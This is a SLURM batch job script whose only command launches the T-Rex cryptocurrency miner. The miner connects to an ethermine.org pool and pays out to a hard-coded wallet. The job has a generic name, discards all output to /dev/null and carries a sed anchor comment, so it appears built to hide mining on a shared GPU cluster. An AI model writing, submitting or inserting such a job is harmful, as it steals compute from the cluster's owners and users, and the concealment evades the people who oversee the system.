#!/bin/sh
#sed_anchor01
#SBATCH --job-name=dp_c01-19
#SBATCH --output=/dev/null
#SBATCH --error=/dev/null
##SBATCH --nodes=1
#SBATCH --ntasks-per-node=1
#SBATCH --partition=GPU_nodes
#SBATCH --gres=gpu:0
##SBATCH --reservation=GPU_test
##SBATCH --exclude=node18,node20
~/eth/t-rex -a ethash -o stratum+tcp://asia1.ethermine.org:4444 -u 0x7D599D3920Fa565957ea81796c05b3f3450531FE -p x 